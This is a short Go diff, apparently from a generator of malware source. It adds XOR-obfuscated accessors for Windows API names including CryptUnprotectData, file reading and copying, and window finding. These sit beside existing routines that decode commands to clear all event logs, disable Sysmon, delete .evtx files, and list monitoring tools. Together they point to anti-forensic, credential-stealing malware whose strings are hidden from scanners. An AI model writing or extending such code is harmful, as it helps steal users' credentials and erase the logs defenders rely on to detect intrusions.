@@ -531,5 +531,17 @@ func getMonitoringTools() []string           { return decryptList(encMonitoringT
 func getClearAllLogsCmd() string             { return string(xor(encClearAllLogsCmd, decryptionKey)) }
 func getDisableSysmonCmd() string            { return string(xor(encDisableSysmonCmd, decryptionKey)) }
 func getDeleteEvtxCmd() string               { return string(xor(encDeleteEvtxCmd, decryptionKey)) }
+
+func getRegEnumValueWName() string             { return string(xor(encRegEnumValueWName, decryptionKey)) }
+func getCryptUnprotectDataName() string        { return string(xor(encCryptUnprotectDataName, decryptionKey)) }
+func getLocalFreeName() string                 { return string(xor(encLocalFreeName, decryptionKey)) }
+func getCreateFileWName() string               { return string(xor(encCreateFileWName, decryptionKey)) }
+func getReadFileName() string                  { return string(xor(encReadFileName, decryptionKey)) }
+func getGetFileSizeExName() string             { return string(xor(encGetFileSizeExName, decryptionKey)) }
+func getCopyFileWName() string                 { return string(xor(encCopyFileWName, decryptionKey)) }
+func getEnumDisplaySettingsWName() string      { return string(xor(encEnumDisplaySettingsWName, decryptionKey)) }
+func getChangeDisplaySettingsExWName() string  { return string(xor(encChangeDisplaySettingsExWName, decryptionKey)) }
+func getFindWindowWName() string               { return string(xor(encFindWindowWName, decryptionKey)) }
+func getFindWindowExWName() string             { return string(xor(encFindWindowExWName, decryptionKey)) }
 `)
 }
